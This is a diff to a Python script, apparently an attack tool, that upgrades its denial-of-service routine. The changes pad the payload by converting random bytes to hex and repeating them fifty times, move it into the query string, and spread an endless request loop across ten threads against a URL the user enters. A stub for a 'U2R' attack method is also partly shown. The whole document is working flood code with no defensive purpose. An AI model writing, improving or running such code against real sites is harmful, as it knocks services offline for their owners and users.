@@ -1,13 +1,13 @@
 import random
 import requests
 import time
-
+import threading
 
 class Attacks:
     def __init__(self):
         try:
             self.size = random.randint(10, 200)
-            self.attack = random._urandom(self.size)
+            self.attack = random._urandom(self.size).hex() * 50  # Convert to hex to make it URL-safe and repeat to increase size
             self.data = "administrator"
             self.url = input("URL> ")
             print(" ")
@@ -20,16 +20,26 @@ class Attacks:
             print(" ")
             exit("\033[1;34m [-]Canceled By User \033[1;m")
 
-    def launch_dos_attack(self):
+    def dos_attack_thread(self):
         while True:
             try:
-                response = requests.get(self.url, data=self.attack)
+                response = requests.get(f"{self.url}?data={self.attack}")
                 print("Attacking sending bytes ===> Status Code:", response.status_code)
             except KeyboardInterrupt:
                 print(" ")
                 exit("\033[1;34m [-]Canceled By User \033[1;m")
             except requests.RequestException as e:
                 print("Request failed:", e)
+
+    def launch_dos_attack(self):
+        threads = []
+        for i in range(10):
+            thread = threading.Thread(target=self.dos_attack_thread)
+            thread.start()
+            threads.append(thread)
+        
+        for thread in threads:
+            thread.join()
 
     def launch_U2R_attack(self):
         try:
@@ -42,3 +52,4 @@ class Attacks:
             exit("\033[1;34m [-]Canceled By User \033[1;m")
         except requests.RequestException as e:
             print("Request failed:", e)
+
